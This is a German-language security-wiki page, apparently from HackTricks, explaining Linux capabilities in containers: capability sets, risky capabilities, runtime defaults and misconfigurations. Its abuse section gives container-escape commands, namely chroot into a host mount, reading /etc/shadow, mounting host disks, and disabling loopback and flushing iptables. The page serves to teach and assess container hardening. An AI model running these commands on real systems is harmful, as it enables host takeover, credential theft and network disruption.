# Linux Capabilities in Containern

{{#include ../../../../banners/hacktricks-training.md}}

## Übersicht

Linux capabilities sind eines der wichtigsten Elemente der Container-Sicherheit, weil sie eine subtile, aber grundlegende Frage beantworten: **was bedeutet "root" innerhalb eines Containers wirklich?** Auf einem normalen Linux-System implizierte UID 0 historisch gesehen eine sehr breite Berechtigungsmenge. In modernen Kerneln wird dieses Privileg in kleinere Einheiten zerlegt, die capabilities genannt werden. Ein Prozess kann als root laufen und trotzdem viele mächtige Operationen nicht ausführen, wenn die entsprechenden capabilities entfernt wurden.

Container bauen stark auf dieser Unterscheidung auf. Viele Workloads werden aus Kompatibilitäts- oder Einfachheitsgründen weiterhin als UID 0 innerhalb des Containers gestartet. Ohne das Droppen von capabilities wäre das viel zu gefährlich. Durch das Droppen von capabilities kann ein containerisierter root-Prozess weiterhin viele gewöhnliche in-Container-Aufgaben ausführen, während ihm sensiblere Kernel-Operationen verweigert werden. Deshalb bedeutet eine Container-Shell, die `uid=0(root)` anzeigt, nicht automatisch "host root" oder gar eine „breite Kernel-Berechtigung“. Die Capability-Sets entscheiden, wie viel diese Root-Identität tatsächlich wert ist.

Für die vollständige Linux-capabilities-Referenz und viele Abuse-Beispiele siehe:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Funktionsweise

Capabilities werden in mehreren Sets verfolgt, darunter the permitted, effective, inheritable, ambient und bounding sets. Für viele Container-Bewertungen sind die genauen Kernel-Semantiken jedes Sets weniger unmittelbar wichtig als die praktische Abschlussfrage: **Welche privilegierten Operationen kann dieser Prozess gerade erfolgreich ausführen, und welche zukünftigen Privilegiengewinne sind noch möglich?**

Der Grund, warum das wichtig ist, ist, dass viele breakout techniques eigentlich Capability-Probleme sind, die als Container-Probleme getarnt sind. Ein Workload mit `CAP_SYS_ADMIN` kann auf eine enorme Menge an Kernel-Funktionalität zugreifen, die ein normaler Container-root-Prozess nicht anfassen sollte. Ein Workload mit `CAP_NET_ADMIN` wird deutlich gefährlicher, wenn er außerdem den Host-Namespace für das Netzwerk teilt. Ein Workload mit `CAP_SYS_PTRACE` wird deutlich interessanter, wenn er Host-Prozesse durch Host-PID-Sharing sehen kann. In Docker oder Podman erscheint das möglicherweise als `--pid=host`; in Kubernetes tritt es üblicherweise als `hostPID: true` auf.

Mit anderen Worten: Das Capability-Set kann nicht isoliert bewertet werden. Es muss zusammen mit Namespaces, seccomp und MAC-Policy gelesen werden.

## Labor

Eine sehr direkte Methode, um capabilities innerhalb eines Containers zu inspizieren, ist:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Sie können auch einen stärker eingeschränkten Container mit einem vergleichen, dem alle capabilities hinzugefügt wurden:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Um die Auswirkung einer gezielten Ergänzung zu sehen, versuchen Sie, alles zu entfernen und nur eine capability wieder hinzuzufügen:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Diese kleinen Experimente zeigen, dass eine Laufzeitumgebung nicht einfach einen Boolean namens "privileged" umschaltet. Sie formt die tatsächliche Privilegienoberfläche, die dem Prozess zur Verfügung steht.

## Hochrisiko-Capabilities

Obwohl viele Capabilities je nach Ziel relevant sein können, sind einige wenige wiederholt relevant in der container escape analysis.

**`CAP_SYS_ADMIN`** ist die Fähigkeit, die Verteidiger mit größter Skepsis behandeln sollten. Sie wird oft als "the new root" bezeichnet, weil sie eine enorme Bandbreite an Funktionen freischaltet, darunter mount-bezogene Operationen, namespace-sensitives Verhalten und viele Kernel-Pfade, die niemals leichtfertig Containern ausgesetzt werden sollten. Wenn ein Container `CAP_SYS_ADMIN`, schwaches seccomp und keine starke MAC-Einschränkung hat, werden viele klassische breakout paths deutlich realistischer.

**`CAP_SYS_PTRACE`** ist wichtig, wenn Prozesssichtbarkeit besteht, insbesondere wenn der PID namespace mit dem Host oder mit interessanten benachbarten Workloads geteilt wird. Es kann Sichtbarkeit in Manipulation verwandeln.

**`CAP_NET_ADMIN`** und **`CAP_NET_RAW`** sind in netzwerkzentrierten Umgebungen relevant. In einem isolierten Bridge-Netzwerk können sie bereits riskant sein; in einem gemeinsamen Host-Netzwerknamespace sind sie deutlich problematischer, weil der Workload möglicherweise das Host-Netzwerk neu konfigurieren, sniff, spoof oder lokale Traffic-Flüsse stören kann.

**`CAP_SYS_MODULE`** ist in einer Umgebung mit Root-Zugriff in der Regel katastrophal, weil das Laden von Kernel-Modulen de facto Kontrolle über den Host-Kernel bedeutet. Es sollte in einem generischen Container-Workload so gut wie nie auftauchen.

## Laufzeitnutzung

Docker, Podman, containerd-based stacks, and CRI-O verwenden alle Capability-Controls, aber die Defaults und Management-Interfaces unterscheiden sich. Docker macht sie sehr direkt über Flags wie `--cap-drop` und `--cap-add` sichtbar. Podman bietet ähnliche Kontrollen und profitiert häufig von rootless execution als zusätzlicher Sicherheitsschicht. Kubernetes macht Capability-Hinzufügungen und -Entfernungen über den Pod- oder Container-`securityContext` sichtbar. System-Container-Umgebungen wie LXC/Incus verlassen sich ebenfalls auf Capability-Control, aber die breitere Host-Integration dieser Systeme verführt Operatoren oft dazu, die Defaults aggressiver zu lockern, als sie es in einer App-Container-Umgebung tun würden.

Dasselbe Prinzip gilt für alle: Eine Capability, die technisch vergeben werden kann, ist nicht zwingend eine, die vergeben werden sollte. Viele reale Vorfälle beginnen damit, dass ein Operator eine Capability hinzufügt, einfach weil ein Workload unter einer strengeren Konfiguration fehlgeschlagen ist und das Team eine schnelle Lösung brauchte.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist **`--cap-add=ALL`** in Docker/Podman-style CLIs, aber das ist nicht der einzige. In der Praxis ist ein häufigereres Problem, dass ein oder zwei extrem mächtige Capabilities, insbesondere `CAP_SYS_ADMIN`, gewährt werden, um "die Anwendung zum Laufen zu bringen", ohne die Auswirkungen auf namespace, seccomp und mount zu verstehen. Ein weiterer häufiger Fehler besteht darin, zusätzliche Capabilities mit der Freigabe von Host-Namespaces zu kombinieren. In Docker oder Podman kann sich das als `--pid=host`, `--network=host` oder `--userns=host` zeigen; in Kubernetes erkennt man die gleichwertige Exposition typischerweise über Workload-Einstellungen wie `hostPID: true` oder `hostNetwork: true`. Jede dieser Kombinationen ändert, was die Capability tatsächlich beeinflussen kann.

Es ist auch häufig, dass Administratoren glauben, weil ein Workload nicht vollständig `--privileged` ist, sei er trotzdem noch wesentlich eingeschränkt. Manchmal ist das wahr, aber manchmal ist die effektive Haltung bereits so nahe an privilegiert, dass die Unterscheidung operativ keine Rolle mehr spielt.

## Missbrauch

Der erste praktische Schritt ist, die effektive Capability-Menge zu enumerieren und sofort die capability-spezifischen Aktionen zu testen, die für einen escape oder den Zugriff auf Host-Informationen relevant wären:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Wenn `CAP_SYS_ADMIN` vorhanden ist, teste zuerst mount-based abuse und host filesystem access, da dies einer der häufigsten breakout enablers ist:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Wenn `CAP_SYS_PTRACE` vorhanden ist und der container interessante Prozesse sehen kann, prüfen Sie, ob die Capability in Prozessinspektion umgewandelt werden kann:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Wenn `CAP_NET_ADMIN` oder `CAP_NET_RAW` vorhanden ist, testen Sie, ob die Workload den sichtbaren Netzwerkstack manipulieren oder zumindest nützliche Netzwerkinformationen sammeln kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Wenn ein Capability-Test erfolgreich ist, kombiniere ihn mit der Namespace-Situation. Eine Capability, die in einem isolierten Namespace lediglich riskant erscheint, kann sofort zu einem Escape- oder Host-Recon-Primitiv werden, wenn der container außerdem host PID, host network oder host mounts teilt.

### Vollständiges Beispiel: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Wenn der container `CAP_SYS_ADMIN` hat und ein beschreibbarer bind mount des host filesystem wie `/host` vorhanden ist, ist der Escape-Pfad oft unkompliziert:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Wenn `chroot` erfolgreich ist, werden Befehle nun im Kontext des Root-Dateisystems des Hosts ausgeführt:
```bash
id
hostname
cat /etc/shadow | head
```
Wenn `chroot` nicht verfügbar ist, kann dasselbe Ergebnis oft erzielt werden, indem man das binary durch den eingebundenen Verzeichnisbaum aufruft:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Vollständiges Beispiel: `CAP_SYS_ADMIN` + Gerätezugriff

Wenn ein Blockgerät des Hosts exponiert ist, kann `CAP_SYS_ADMIN` daraus direkten Zugriff auf das Host-Dateisystem ermöglichen:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Vollständiges Beispiel: `CAP_NET_ADMIN` + Host Networking

Diese Kombination führt nicht immer direkt zu root auf dem Host, kann jedoch den Netzwerkstack des Hosts vollständig neu konfigurieren:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Das kann denial of service, traffic interception ermöglichen oder Zugriff auf zuvor gefilterte Dienste gewähren.

## Prüfungen

Ziel der Capability-Checks ist es nicht nur, rohe Werte auszulesen, sondern zu beurteilen, ob der Prozess über genügend Privilegien verfügt, um seine aktuelle Namespace- und Mount-Situation gefährlich zu machen.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Was hier interessant ist:

- `capsh --print` ist der einfachste Weg, um hochriskante capabilities wie `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` oder `cap_sys_module` zu erkennen.
- Die `CapEff`-Zeile in `/proc/self/status` zeigt, welche capabilities jetzt tatsächlich wirksam sind, nicht nur, welche in anderen Sets verfügbar sein könnten.
- Ein capability dump wird viel wichtiger, wenn der Container außerdem Host-PID-, Network- oder User-Namespaces teilt oder beschreibbare Host-Mounts hat.

Nach der Erfassung der rohen capability-Informationen ist der nächste Schritt die Interpretation. Frage, ob der Prozess root ist, ob user namespaces aktiv sind, ob Host-Namespaces geteilt werden, ob seccomp enforcing ist, und ob AppArmor oder SELinux den Prozess weiterhin einschränken. Ein capability-Set allein ist nur ein Teil der Geschichte, aber es ist oft der Teil, der erklärt, warum ein Container-Breakout funktioniert und ein anderer beim gleichen offensichtlichen Ausgangspunkt fehlschlägt.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker keeps a default allowlist of capabilities and drops the rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers are unprivileged by default and use a reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | The effective set depends on the runtime plus the Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Für Kubernetes ist der wichtige Punkt, dass die API kein einheitliches universelles Standard-Capability-Set definiert. Wenn der Pod keine capabilities hinzufügt oder entfernt, erbt die Workload das Runtime-Default für diesen Knoten.
{{#include ../../../../banners/hacktricks-training.md}}
